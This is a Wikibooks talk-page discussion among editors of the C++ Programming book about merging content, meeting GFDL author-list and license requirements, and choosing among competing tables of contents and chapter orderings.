I agree with moving the book into its own chapter if there are no objections from anyone else. I suggest using the mergeto/mergefrom tags both on the main page and the main page here, to see if anyone has any objections with its merger. If noboby objections, then where its located in the Table of Contents or full/print book view doesn't really matter, since we're both presenting different views of the book. Preserving its structure may be a good idea for now. For example if/when moving the main page of the book move it to &quot;C++ Programming/Exercises&quot; and move its chapters to &quot;C++ Programming/Exercises/chapter&quot;. My only objections is transcluding to existing chapters of the C++ Programming book, since that would effect multiple views, but changing Table of Contents and full/print views isn't as big a deal, since different perspectives on this can still be maintained. So for now if you wish to get it done, do the mergeto/mergefrom tags, give it a week or so, then move into here if nobody objects, preserving its structure and make changes to the Table of Contents and full/print view as you wish.

BTW I still think the TOC thats the main page seen when going to this book needs to be moved to something like &quot;C++ Programming/TOC1&quot; and instead present a different main/front page that shows the current cover image, chapters needing work and list of different views along with a link to the print/full page view and if you wish an edit link for the print/full page view. I've looked at how another book makes use of the front page that looks promising for ideas of what might work for this one, so I think I may do some more editing of my test page. --[[User:Darklama|darklama]] 13:02, 30 October 2006 (UTC)

== What a huge mess of misinformation and lack of knowledge ==

I have no idea why there is any objection at all to including a list of authors on this page, or why there is such a huge resistance to efficiently create a realistic list of authors other than, and I quote &quot;Panic and other unnamed heroes...&quot;.  This is the most insane thing I have ever seen in all my time that I've been working on Wikibooks.  Seriously.  Is this really what all of the big fight is over between the two of you, Darklama and Panic?

The GFDL, section 2(b) clearly states that you must:

:&quot;B. List on the Title Page, as authors, one or more persons or entities responsible for authorship of the modifications in the Modified Version, together with at least five of the principal authors of the Document (all of its principal authors, if it has fewer than five), unless they release you from this requirement.&quot;

Providing a round-about list to a bunch of hyperlinks that you have to click on more than a hundred times to determine who some of the authors are simply does not fit this requirement.  I.E. the page histories of all of the modules in a given Wikibook.  While that is useful to '''''generate a list of authors''''', that is not an author list at all.  When you add in people who deserve absolutely no credit, notably blatant vandals who have been completely reverted and admins (and others on the recent changes patrol) whose only participation was to revert those same vandalism attacks, as well as culling out all of the IP contributions (those can realistically be called &quot;anonymous&quot; edits as no single person can legitimately claim authorship situation here), you have already shown this list of contributors to be faulty.

The only realistic method of presentng this list of authors can only be done (at the moment) on a manually generated &quot;author&quot; page in order to meet this legal requirement of the GFDL.  This is not copyright law that applies here, but the legal requirements of this license.  If you choose not to keep the terms of this license, your right to copy this document is void as you have no other license (this book is not dual-licensed).  Your attempt to copy this book, including printing it for personal consumption is a copyright violation.

As far as including the full text of the GFDL here, I would say that it is absolutely manditory here as well.  Keep in mind that this is supposed to be the &quot;printed version&quot; of this textbook.  The GFDL itself says in section 2(H):

:&quot;H. Include an unaltered copy of this License.&quot;

This doesn't say include a hyperlink to this license.  It doesn't say that you can distribute the content and the license seperately.  It says that you have to include the license.

Try this experimet.  On your web browser, grab any old page here on Wikibooks and then click on &quot;file&quot; and then &quot;save&quot;.  Put the web page into a new directory (just to make things simple here.

Now go back to that directory on your local hard drive.  Open it up in your file browser (not in your web browser).  You will see an interesting file that appeared there beside the html file.  Open the file named &quot;License.txt&quot;.  Get what is in that file.  Got it now?

If this page is intended to be turned into a printed version of this document, as in you would be able to click &quot;file&quot; then &quot;print&quot; on your browser, it simply must have the GFDL documet included here.  It is a very real legal requirement according to the GFDL... not for this web page but for the printed version that comes out of your printer.  Including this GFDL text within this page is the only way to accomplish this legal requirement.  --[[User:Robert Horning|Rob Horning]] 04:40, 25 March 2007 (UTC)

The GFDL license always was included on the page.

: I would prefer there to be a more general discussion perhaps on the staff lounge, on this subject. Right now Wikibooks has no policy requiring an authors page. Indeed there are probably a ton of books on Wikibooks that are available for print out without an author's page. So by your own words, as I understand them, we have a huge GFDL violation issue and need to discussion how to resolve this issue in general, rather then for any one specific book. I won't get into any details on my view of that here, to try to avoid this being discussed here. --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[Image:Yin yang.svg|12px]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 14:09, 25 March 2007 (UTC)

&lt;small&gt;''This conversation moved from [[Talk:C%2B%2B_Programming|Talk:C++ Programming]].''&lt;/small&gt;

Can anyone explain in 1000 words or less why there are three different main navigation pages for this book? In what way do readers or contributors benefit? --[[User:Xixtas|&lt;span style=&quot;color:turquoise&quot;&gt;xixtas&lt;/span&gt;]] &lt;sup&gt;[[User_Talk:Xixtas|&lt;span style=&quot;color:magenta&quot;&gt;talk&lt;/span&gt;]]&lt;/sup&gt; 21:13, 25 March 2007 (UTC)

: TOC1 and TOC2 were the result of differences in opinion, on how the chapters should be organized for reading, in which the only compromise that could be reached was to allow more than one way to exist, where readers could pick. Editors TOC was the result of bold action to present a cover page for readers and writers to pick which one to use, along with things that need work or people would like to see added, and links for print versions of all the chapters in the two currently presented reading orders, until it was moved yesterday to Editors TOC.
: This book has a history of having different navigation methods. In the past there existed navigation involving a table of content sidebar with the contents to the left or right of it and one involving table of contents top bar with the contents underneath it. Which eventually was deleted due to nobody maintaining it and agreement to delete it. The only benefits I can see is choice and reuse without actually much duplication. --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[Image:Yin yang.svg|12px]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 22:20, 25 March 2007 (UTC)

:: The statement above is partially correct, TOC1 was the original structure &quot;I&quot; and in that I must be clear that without particular objection, only on some content that Paddu objected and that lead to the so called &quot;fork&quot;. (I say this for historical reference and because it is true).&lt;br&gt;
::Most references inside the various chapters/pages are structured or I actively worked to and intended them to be so, to provide some structure and a logic sequence to the text (I admit that there can be other preferences), the 3 navigation schemes that existed came also from the book merge, I didn't object to their creation and use on the book but they didn't perform any order change to the pages/chapters and were abandoned (one of the conditions I asked to the implementor was that I had not to maintain them, as with TOC2). They were removed as a request for Darklama and without opposition by me.&lt;br&gt;
::I don't object to any navigation scheme that can bypassed to provide a monolithic view (I and several users seem to also like to be able to see the book on that way, for posts I saw here and there, It is a book convention to have that setup), the Editor's TOC (I named it so) as it didn't provide a global view of the book and was mostly useful (and is a great idea) to editors but broke the default navigation scheme provided by the use of the page name convention (&quot;/&quot;) and its substitution was indeed contested by me actively, in particular to the removal of the link to the authors page that I see as a necessity on the book cover/title page.  --[[User:Panic2k4|Panic]] 22:43, 25 March 2007 (UTC)
:::Okay, so the cover page should contain a link to the author's page, I agree with that. What else? Obviously what is an appropriate index is contested, but there should be at least some general index of content on the front page to serve readers. Speaking about books generally and not this book in particular, it seems to me that the front page should be directed at readers and perhaps a secondary portal page could be created for authors because everyone first experiences the book as a reader.

::::I think this is the result of Darklama being to much bold on the changes without listening to my objection, there were indeed action that have gone against some conventions of the book and resulted in deletion of pages, content and a corruption on the history logs in particular to the page [[C++ Programming/Programming Basics]] that is a result of merging 3 other pages that were deleted.( this was verified by other Administrator like Whiteknigh and there is still a comment on the last posts of this thread [[User_talk:Robert_Horning#Sorry_for_all_that_mess]]).   --[[User:Panic2k4|Panic]] 23:55, 25 March 2007 (UTC)

That is not so easy (and that is why it wasn't done in the first place besides changes to the content), it will continue to break the navigation scheme used by the page names the root must always be a index of all the content.&lt;br&gt;It is possible to add a different root but not a bifurcation Go A or Go B.&lt;br&gt;
BOOKCOVER &lt;-&gt; BOOKTOC &lt;-&gt; BOOKCHAPTER &lt;-&gt; BOOKPAGE/SECTION  (how can there be a path selection there ?)&lt;br&gt;
As for the names I don't have a clue, TOC stands for table of content or index as Darklamas was next, probably calling TOC2  Alternative Index is a good definition but the problems don't end there, who will maintain 3+ TOCs, and if anyone offered to create yet another or several? And who will check for divergences and collisions on the content (references to pages or chapter names, content out of order because in a TOC subject A goes before B and in the other A is after B etc... and this only in 2 distinct structures)&lt;br&gt;
Xixtas if I understand what you are stating, is that history has no relevance, and if it's so, I strongly disagree with that assessment. Have you created or contributed heavily to any book on Wikibooks, please state the name, I have a urge to create a new TOC there, or just start reorganizing the hell out of it (and I can probably find 1001 ways to justify the changes) :), lol see the logic? lol it would be very, very, funny if anyone attempted that for instance on the Ada book.  --[[User:Panic2k4|Panic]] 05:10, 26 March 2007 (UTC)

::: Perhaps you can explain to me why you believe that ''&quot;it will continue to break the navigation scheme used by the page names the root must always be a index of all the content.&quot;'' In what specific way would the navigation scheme be broken if the TOC was moved to a subpage like Book Name/Table of Contents?

::::Sorry about that, but then what was you referring to &quot;try not to bring up old arguments&quot; ?, today only exist because of yesterday, it is that sequence of events that brings linearity and logic, if we deny the past what meaning has the present.  By arguments I understand facts or points of divergence, that until resolved must be addressed, ignoring them wont do and what you (and others) think and do is very relevant, at least to me, how else could I interact with you ?
::::The navigation scheme only supports movements forward and backward, a cover pages as Darklama indicated has no problem in being inserted on the front but how do you implement a bifurcation (or even 3 TOCs) if a user choses a chapter and wants to get to the list of chapters how does he work it out, it will have to remember at least what TOC he selected to get to the proper index, imagine this repeated 3 or 4 times, that is really non intuitive and so breaks it.
::::Can you give me an example on that &quot;Divergences and collisions of content can be handled by avoiding clumsy linear references&quot; this works on the Wiki env but not in a single page or in the printed version. (changing these option can't be part of a BeBold action).

I am focused in resolving the issues, but if Darklama doesn't maintain the TOC it will be a question of time to make this issue irrelevant, and I'm still against the logic of making changes off this nature on a very active book, knowing that it was not agreed upon. (not because of this book, but changes of this kind should not be subject to BeBold action it is almost as chattering to a book as a merge of significant content)&lt;br&gt;
When I asked you to reposition TOC1 in its original position was based on that fact, because it was there and was removed on a unilateral decission in express contradiction of what I and him had talked about (it was indeed waiting a viable solution).&lt;br&gt;
I don't agree with the wording obligation in &quot;obligation that we all have, to work with others&quot; there are various levels of collaboration and collaboration doesn't make it an obligation. An making others wishes came to fruition is way beyond collaboration.&lt;br&gt;
You haven't understood the problem completely :) if we add a cover pages (and considering only that) we must move all pages for instance coverpage &lt;-&gt; toc (on root) &lt;-&gt; some other page (on root) if you click on the default navigation button you will go to the coverpage not the toc as you need to select another page/chapter.
To understand the problem enter the book as a reader and start using toc2, select a page and examine the navigation options, go back to the same toc2 and select another page, and you will see the problem.&lt;br&gt;
As for the image it is cool (what city is it?) but doesn't have nothing to do with the subject (in that the actual one also doesn't but at least it is smaller (and in file size as well), the one that exist now was enforced by the merging administrator (the merging of the books was unlawful), the original cover page is still on the book for further discussion and waiting a proposal to restore the books name (see content discussion page) one of the first posts.

Perhaps more real world examples and flow within the book would make it more user friendly. Having more than one table of contents may serve to confuse and frustrate readers as well. Also, looking at programs from a larger scale and focusing on practical applications like user interface design within C++ in Windows and Linux (or other) systems and  maybe fruitful. Thank you all for your contributions to the C++ book. C++ certainly is quite an important topic and probably one of the most widely used and functional languages as well, so it is quite an important book for the community. --[[User:Remi0o|Remi]] 23:39, 13 April 2007 (UTC)

:Interesting ideas.

:One difficulty with covering large scale programming issues is that the examples and explanations of any one could often fill a dedicated book -- and it's necessary to have a good understanding of the language (and standard library) before looking at the many factors involved in &quot;real-world&quot; programming in the large.  It might be interesting to try to address that though; the online/wikibook form might have strengths that print books do not (for example, the fact that a 200-page appendix to cover one example might be entirely reasonable online).

:User interface design (with a C++ slant) is another area worthy of one or more books on its own.  Two issues are (a) the fact that C++ has no standard UI library, so it's necessary to pick one or more to use, and (b) the fact that many UI designs are handled fairly well by less powerful tools than C++.

:(An aside: C++ isn't much of a &quot;functional&quot; programming language, though it has some limited support for some functional concepts.  But you probably didn't mean &quot;functional&quot; in the technical sense.)

:Thanks for the feedback/ideas (and your other input too).  -- [[User:James Dennett|James Dennett]] 18:25, 14 April 2007 (UTC)

::I share Remi vision for the development for the book, but such vision was contested previously on the book, it was one on the reasons that lead to the fork, or for the yet to be resolved move of the MFC pages out of the book unilaterally by Darklama, having said this, if we think about priorities, there are for now plenty to be added yet and some of the subjects Remi points out are now listed at least on the editor's toc for development...
::Make files, source control, POSIX, Unicode, 32 to 64Bits and unit testing are without doubt less contested or less prone to cause conflict in adding them to the book, for me I also have a personal wish to take on wxWidgets in a near future, at the moment I'm developing software for windows (and with Linux in mind, WINE) using the MFC libraries, considering market share of the OSs this is a important subject not only for anyone intending to build more that experimental software or generic libraries. GUI and Networking are nowadays important to every developer and even to the a language (the C++ may evolve to support some of this functionalities in one way or another directly), at least that is what I've been reading from time to time, even if making it a reality would be difficulty, uniformity and a consistent API would indeed be a life improvement to any C++ programmer, at the moment we are faced with competing  solutions battling for developers attention, some are not as free as they could be and are more shackles than an helping hand (btw I have a personal &quot;hate&quot; for the .net platform in specially to C++/CLI, count me out to contribute to one section about it :), but for instance I'm watching with attention the development of IronPython as a RAD tool for the MS platform, it will make prototyping a breeze).  --[[User:Panic2k4|Panic]] 19:28, 14 April 2007 (UTC)

::::Well I was going to stay quiet and see were you were going [[User talk:VenomousNinja]], since you had much enthusiasm but showed  a limited level of knowledge of the problem involving the TOCs, and indeed you seemed aggressive in your stance, if the issue was still hot you would probably cause more damage than help solve anything in that way. Wikibooks is about dialog, compromise and consensus and a small set or rules are provided to avoid conflicts, due to the level/tone of your overall contributions I didn't took your first (signed) post as needing a reply and I generally avoid replying to unsigned posts, if you were the author of those, please consider that as the probable reason no one did address you. 
::::Since [[User:James Dennett|James Dennett]] did try to address your concerns I will take this time to explain the issues to you, so to reduce the possibility that any problem may arise. As it is the TOCs have no real problem, at least at present the issue, as I see it is almost resolved.
::::The foremost problem was addressed by an administrative removal of any TOC from the &quot;coverpage&quot; (to no one satisfaction I'm sure) and a lock is in place since then, that in itself as I see it against the normal ways such edit disputes should addressed or resolved but the conflict at the time was hot and not primarily around the TOCs.
::::As I see it the original sin and my primary concern was the unilateral substitution of the existing TOC by another, even after an extensive dialog and expressed objections were known and understood, looking back, it could have been a result of other active debates around several other and mostly unrelated issues, anyway the issue was as I said above resolved administratively with the result that we now have. What is still on the table is not the content/validity or immutability of of the TOCs (all TOCs were always open to edits, the book had even previously to this problem other TOCs) but the reposition of the status quo, that is the reversal of the first action, restoring the TOC to its original location (since the implementation of an address all solution is impractical if not technically impossible at present, having multiple TOCs exist on the cover page enabling several navigational schemes), in any case the substitution toc that was moved to the coverpage has been stale since the last &quot;content&quot; edit September 2007, at present it indexes less that 50% of the work and is mostly obsolete (there are other related edit concerns but not directly relevant to the issue). Since the creator of the alternative TOC did mostly esthetically and structural changes to the work, ie: created also the useful Editor's TOC (not part of the issue), and has since then started another book on the same topic (that is also stale now but created with the scope he was attempting to formalize on TOC2), since then there was a proposal to deleted TOC2 that has (formally) passed but need that I gather some confidence and check if the other part was aware of it (the page was monitored but may have removed it from the watchlist by accident), since I think the other editor must be directly informed before proceeding, but I have been procrastinating doing it...

The answer is because our books don't have a high quality of work, which is caused by the multiple ToCs, another one of the reasons we aren't a featured book.

I take you have some reservations on toc2 deletion by your vote on the aborted VFD (to what I gave a reply) but you failed again to commit in the extension (7-9 days) made to the adoption of the proposal, just to address the VFD vote you made, since there was no objection before that, I have made you direct request to express any still lingering objection, solution or alternative on the proper forum.

== Suggestions on TOC1 ==
Hello friends,
I would like to bring your attention to the way the Contents of TOC1 is organized. You can see Baics, Advanced wtc. I found templates, exception handling etc in the advanced section. What I feel is few years before the text books organised these sections to advanced when they were introduced. Now they are mandatory part of core C++ language knowledge. Hence I would suggest to remove those kind of subsectioning. Rather what will be appealing is have a chapter on Exception handling which should become a bible as we progress. Have a chapter on Resource Management where we should collect everything about memory management. PLEASE DON@T DIVIDE THE CORE LANGUAGE FEATURES TO ADVANCED SECTION AS THE READERS WILL FEEL THAT THEY KNOW ENOUGH C++ AFTER READING BASICS BUT IN REAL LIFE THAT IS NOT AT ALL ENOUGH.
Regards,
[[User:Jayaram Ganapathy|Jayaram Ganapathy]]

:Good point, the naming of the chapters has also suffered a bit of evolution, Darklama didn't agreed with the original names and order (that was I think one of the motivations for the creation of TOC2), I'll give a look on how it was before...  --[[User:Panic2k4|Panic]] 17:02, 11 April 2007 (UTC)

:Take a look at [http://en.wikibooks.org/w/index.php?title=C%2B%2B_Programming/TOC1&amp;oldid=430468 TOC1 in 16 April 2006] the basics was called fundamentals, and indeed fundamentals give the idea of the foundation for something else and doesn't qualify the content in itself. I'll try and see what I can do about it.  --[[User:Panic2k4|Panic]] 17:07, 11 April 2007 (UTC)

:As for removing the advanced section what is your proposition? Merging with the &quot;Fundamentals&quot; would not be correct (they are indeed extra features of the language that may not even be used for simple programs and there are old programs that don't use this &quot;new&quot; concepts&quot;), it would also be wrong to mix it with the part about objects (classes etc) do you have a particular idea for that or removing the word Basic and probably give a little introduction at the begging of the chapter (with your points about the importance on learning all and probably a bit of history on the evolution of C++, to explain why). I have removed the word basic (if you feel that it partially addresses the problem I will rename the pages also. Did it help at all ?  --[[User:Panic2k4|Panic]] 17:17, 11 April 2007 (UTC)

The core language of C++ should comprise one section. The language is so interdependent that you cannot say exception handling is advanced and constrors are basic. When you write a ctor you should be aware that only exceptions are the only way to return the status of what happened in a ctor. Similarly you should not through an exception from destructor because when stack unwinding happens if an objects being destructed again throws an exception what will you do etc..
So the core language is one section and don't divide it into basic advanced etc. then the standard things as a section and non standard things in another section.
Divide contents into 4

 Introduction 
            having all general things like what is a compiler, history of B, C C++ etc..
 C++ Language
            Core language
 Standard libraries
           standard c libraries, STL etc
 Design Patterns implemented in C++
           STructura, behavioural etc..
 Beyond the standard
           Socke programming, threads etc Boost library , crypto graphy etc 
 Appendix
         what ever meta information we want to have

 And by the way we are into an ocean and new things will always keep on coming to be added. We will discuss and include it appropriately.

[[User:Jayaram Ganapathy|Jayaram Ganapathy]]

:Have you got the C++ Standard ? If you take a look they do precisely that, I removed the word basic, it wasn't there because I added it fundamentals seems a better definition and was the original label of that section, the idea is that you can code in C++ without using exception handling, but contructors are needed to explain classes and um problably would be crazy not to use classes on a C++ program, but the TOC as it is is perfectly acceptable the problem seem to be the verbosity of the summaries of some section and that with time will be resolved (we have to take into consideration that the book originally was a monolithic page, I have split it across topics but some topics are still to generic to by name give an idea of what is inside, the other problem with TOC2 is the order of the topic again if we take a look as how it is ordered on the standard reference we see that there isn't no optimal order, so far I have ordered as people have asked and how I would have liked to read a book about C++ and other were ordered that way before I wrote a line into it.  --[[User:Panic2k4|Panic]] 17:34, 12 April 2007 (UTC)

::I agree with Jayaram that exceptions ought not to be considered an advanced topic in any modern text on C++.  The C++ standard is emphatically not organized as a tutorial or even as a reference guide.  The ordering in TOC2 seems to me to be much closer to what I want in a contemporary book on C++.  I could accept adding additional entries to TOC2, so long as it retains its visual cleanliness.  -- [[User:James Dennett|James Dennett]] 18:04, 12 April 2007 (UTC)

For me the contants and quality of materials is important. Even the name is not much important for me. Once the content is there TOC can be created in different ways. I like the layout of TOC2. At the end of the day a person refers to a material which he likes :-) . By the way some one wants to give a boost to boost libraries. Is that really needed?
[[User:Jayaram Ganapathy|Jayaram Ganapathy]]

:::The visual cleanliness of TOC2 can't be guaranteed (unless we make it a book convention), make a proposal that explains what you meant by visual cleanliness (I call it simplicity), or provide a simple structural framework as example, and that would at least prevent it degrading, in any case anyone is are free to edit any page, but to provide a &quot;standard&quot; it should be written down, so to avoid divergences, add the proposal to the proper section and if up to me we should adopt it.  --[[User:Panic2k4|Panic]] 18:46, 12 April 2007 (UTC)

::::Guarantees aren't relevant.  Very little of subjective value can be guaranteed, but that is normally not a major problem.  Aesthetics cannot be defined by rules and standards.  At some level we have to trust that people can form a consensus on a layout/appearance that works well.  Common sense is a better guide here than frameworks, standards, and formal proposals, in my opinion. -- [[User:James Dennett|James Dennett]] 19:56, 12 April 2007 (UTC)

*reset

Agree but if you don't inform others what the goal is, it is difficult to hope that the layout or appearance would evolve on a single line or that it would continue to be as clean as it is now, that was what I was stating, if you provide some guideline people may decide to agree with you and commit to it (I would support it), if not &quot;so long as it retains its visual cleanliness&quot; may indeed be a small timeframe, it all depends on the number of editors and how divergent their aesthetic values are.  --[[User:Panic2k4|Panic]] 20:15, 12 April 2007 (UTC)

Take for instance the TODO box example, we could have 101 versions of the box in use on the book but agreeing in using a standard the text becomes more consistent, or for instance how you set code styles on a project if you don't inform the other programmers the result can be very messy, but do as you will, I was just pointing out that particular need...  --[[User:Panic2k4|Panic]] 20:21, 12 April 2007 (UTC)

:It's not necessary to inform others in advance, though a small note on the Talk page could do that anyway.  Assume good faith; most editors will not do dreadful things.  If there is something that looks problematic, we can discuss it with the relevant editor at the time and resolve it.  I don't see a need for people to &quot;commit&quot; to guidelines for a specific page; the general principles of courtesy and common sense governing Wikibooks are usually sufficient. -- [[User:James Dennett|James Dennett]] 22:23, 12 April 2007 (UTC)

::That was what I was pointing out, it isn't a question of good or bad faith it is a question of consistency of actions, if you agree move this discussion to the content discussion page and evolve a bit more on what you consider maintaining the toc2 clear, I think I understand what you mean by it, but even that main not be correct, I don't intend in editing toc2 but if I see activity there I will help fix anything that becomes broken.  --[[User:Panic2k4|Panic]] 22:36, 12 April 2007 (UTC)

:::I'm sorry, I don't understand what you've written above.  Could you rephrase it maybe? -- [[User:James Dennett|James Dennett]] 23:45, 12 April 2007 (UTC)

::::No problem, What I was trying to say from the start is that this is not a case of assuming good or bad faith, if not informed editors may pull in divergent directions. Stating some expectations or guidelines will improve consistency of edits, reduce confusion and avoid divergence of viewpoints (or at least make them clear), this can only be done by providing a goal or objective.
::::Toward that objective and considering your views and it seems Darklama's opinion expressed on TOC2, it would be helpful that some of what you expect to be written down so others can work in the same direction.  --[[User:Panic2k4|Panic]] 23:53, 12 April 2007 (UTC)

That is an hard one, I have looked at several wikibooks and there seems not to exist a standard look, each seems to use the best format that addresses that particular book, I have made comments that the [[Nanotechnology]] TOC seems complex, but I would be hard pressed to came with a setup that would result as good as the one they used, another &quot;look&quot; is the one used on the [[C Programming]] book, it is close to what is now on TOC2, a simple and direct not thrills or with extensive information, that seems also to work well as the book is still very small (much more could be added to it), our TOC1 resembles more the [[Java Programming]] but has gone beyond that has the C++ Programming book now has more content and topics. As for the optimal or preferred option or setup I can't say I have one, I like the one that works for me (but I take into consideration not only what I want but the purpose that it serves), I'm not a Web designed (nor I like it very much, heck I use TiddlyWiki for my own pages as much as I can not to get into it :) ), I have done several UIs and I have an active project with a community than seems to like my design but software human-machine interfaces aren't exactly portable to the Web environment or even more to a Wikistyle, anyhow every CS course has a class that teaches how to go about it (colors, distribution, stratification of information by usefulness etc) but it doesn't take into consideration personal tastes or ones eye for detail :).  --[[User:Panic2k4|Panic]] 00:26, 13 April 2007 (UTC)

I generally prefer both simplicity and making good use of space on a page, so to me [[Bartending]] and [[European History/Contents|European History]] look kind of good. I also think [[Haskell]]'s use of tables for the table of contents across the page looks good, because it uses more of the page, not leaving as much empty space and could be useful for this book too. --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[Image:Yin yang.svg|12px]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 00:55, 13 April 2007 (UTC)

: Some observations/opinions about those TOCs. [[Nanotechnology]] - Great book very interesting read. But the Table of Contents isn't one I'd want to emulate. I think it makes it harder to find content than if it were presented linearly. [[C Programming]] is spare and lacks a lot of the features I think a good TOC can have. [[Java Programming]] seems to have some consistency problems but leaving that aside, the subheads are used for placemarkers within the module. I like the practical, spare setup of of Java programming. I think it makes it pretty easy to find what you are looking for. This is not how TOC1 is set up, TOC1 is much more difficult to use to find content. [[Bartending]] I really like this one except for the unused whitespace under the picture. [[European History/Contents|European History]] I like but isn't really suitable for a programming book. [[Haskell]]'s tables and use of tracks are interesting, and I don't feel that they are as difficult to navigate as the Nanotech TOC. In general people go to tables of contents to direct them to somewhere else. They are looking for something. Having too many words makes finding things difficult, having too deep a hierarchal structure makes finding things more difficult, not less so. --[[User:Xixtas|&lt;span style=&quot;color:turquoise&quot;&gt;xixtas&lt;/span&gt;]] &lt;sup&gt;[[User_Talk:Xixtas|&lt;span style=&quot;color:magenta&quot;&gt;talk&lt;/span&gt;]]&lt;/sup&gt; 13:31, 13 April 2007 (UTC)
:: I've walk throw the book. It is great! It has 'everything' to know about C++, including history, macros and so on. War near TOC is only a symptom of another problem. I see there is problem, which TOC to chose. I think this problem follows from the fact, that this book has 'all in one solution'. It just describes every aspect of C++ (and even more general aspects as debugging). Anybody, that doesn't know anything about programming, can just read this book and receives all informational (and beyond) he needs to start programming. But I think, it will be better idea to 'split' the book on smaller books. Perhaps, by level of programming, perhaps by themes. In such a way, if somebody know basics of C++ but want to learn more, he will take only those books that covers themes he doesn't know. Splitting out the book will resolve TOC issue immediately.

Since nobody else was trying anything, I decided to try to clean up TOC1 a little bit as per the criticisms people have mentioned about it.

This is a request for comment about what should be on the front page. I suggest [[C%2B%2B_Programming/TOC2|TOC2]] with a prominent link the &quot;[[C%2B%2B_Programming/Editor%27s_TOC|Editors TOC]]&quot;. Appropriate parts of TOC1 should be incorporated into TOC2 (the front page) and TOC1 should be deleted leaving only one table of contents, one editor's portal and one book. What do other people think? --[[User:Xixtas|&lt;span style=&quot;color:turquoise&quot;&gt;xixtas&lt;/span&gt;]] &lt;sup&gt;[[User_Talk:Xixtas|&lt;span style=&quot;color:magenta&quot;&gt;talk&lt;/span&gt;]]&lt;/sup&gt; 23:49, 5 April 2007 (UTC)

: That would certainly seem to me to be an improvement on the status quo.  I'd like what is currently TOC2 to be more prominent and to be extended to be comprehensive.  It might be nice to have a &quot;cover page&quot; with some kind of picture and few words, linking to what's now TOC2, but that can be added at leisure; the main need is to make the book useful from the front page, and moving TOC2 there would largely achieve that.  In my opinion, though it was not my work, TOC2 is the best-structured and best-presented top-level navigation tool for this book at the present time. -- [[User:James Dennett|James Dennett]] 16:46, 6 April 2007 (UTC)

: I agree with James Dennett on the coverpage with a picture and probably with the scope of the book, as people navigating to the toc aren't particularly interested in having the scope shown every time the page loads, the problem with that proposal is that all pages would have to be shifted to a new location, probably a content &quot;directory&quot;, no big problem but lots of work for something that is more eye candy than anything else, if anyone would commit doing it they would need to finish it, that is the only problem I have with that change.
: As for selecting TOC2 as the main table of content I have several problem that I have already enumerated previously, but I would like to understand what for James is the benefit that particular selection would bring over any other?
: Xixtas can you express also why you suggest TOC2 ?
: To me TOC1 is easier to navigate to any page of the book, provides a better insight on were all information is (this is also useful to point contributions as people can more easily edit and contribute in the proper section/page without a deep understanding of the global structure/framework), it uses chapters and is up-to-date now, as it reflects and provides the structure to the actual content and I guarantee my commitment to its maintenance (in the meaning that if no one updates it, I guarantee doing it), the only &quot;problem&quot; is that it displays more text but it offers also more options, this is a Wikimedia software limitation that menus or other type of controls can't be used. --[[User:Panic2k4|Panic]] 21:45, 6 April 2007 (UTC)

:: (Re: the choice of which TOC.) It's subjective, bug I cannot read TOC1 or find anything on it; it's visually too cluttered and chaotic looking.  If I wanted to exaggerate for effect, I'd say it was in the &quot;please stop it, it makes my eyes bleed&quot; category of page design.  The simpler, &quot;cleaner&quot; presentation of TOC2 makes it a lot easier to use -- for me, at least.  (I'll observe in passing that when I design user interfaces, other people usually dislike them but they're very efficient &lt;em&gt;for me&lt;/em&gt;.

:::Ho, I understand you there and agree that it contains to much text, probably removing the summaries would make it less cumbersome but would also hide useful information (to a user that doesn't know much about the structure or what content is available), we must also consider that the book isn't even in a 50% done situation by removing the extra information it would indeed make it less chaotic but probably harder to use and contribute, to me as editor and as user of the book I prefer using the monolithic version to have a feel on how the book is doing and evolving and to know what is missing and it does indeed helps to fix the structure, this was the principal reason the TOC1 has evolved has it did, bandwidth and speed is a major limitation to most users.
:::I'm not oppose to removing the summaries of the chapters if people think it would make it better (one can always have a complete copy on his userspace for reference) but the idea that lead to be as it is was to make it easy to go from page to page without having to open a complete chapter to read a single page, this is the basic usefulness of having a TOC (there was a request and approved on the book conventions to limit pages to 32K), a result from users requesting the dropping of the old monolithic view I used at the beginning to structure the book.
:::Personally I like a sparse(to the point) interfaces (that is one of the requisites I use to select and use anything)  for example Google above Yahoo or del.ici.os over other bookmarking services but here we have a interface limitation that does prevent the customization of what is shown (for instance it would be great to hide the summaries as we can hide/show the TOC of a page)

I've never seen a professionally produced book structured like TOC1 before. It's 4 levels deep (if you count the chapter headings as a level (which we should). But I don't really think my opinion matters too much. Also I would be happy with any table of contents that results in a low amount of duplicate content and pages with similar names being used in different versions. --[[User:Xixtas|&lt;span style=&quot;color:turquoise&quot;&gt;xixtas&lt;/span&gt;]] &lt;sup&gt;[[User_Talk:Xixtas|&lt;span style=&quot;color:magenta&quot;&gt;talk&lt;/span&gt;]]&lt;/sup&gt; 22:53, 8 April 2007 (UTC)

For me TOC2 is better. For example the core language exception and templates is added into an advanced section whch I cannot agree. It gives a wrong impression to the reader and for a beginner he will feel exception, templates etc are advanced features and no need to know. I will suggest we create good quality materials in each section which should become a bible for the subtopic. 
Meanwhile we shouldn't omit any section from TOC1. All to be merged with TOC2 and if TOC2 is missing we have to add new sections.

TOC1 contents which actually makes a long page is due to including the subsections in the page. Anyway when we open a chapter we get again the subsections in the top of the page. So all info in TOC1 we should link to subsections of appropriate main titles. This will be easy to navigate and the reader will not deviate from the concept he was actually looking for.

I have now addressed the problem of pages with &quot;similar&quot; names (and even removed some unused pages and redirects) and  restored some of the log history of others and the names now at least reflect more the content (there is some more work needed there but it is being addressed).&lt;br&gt;
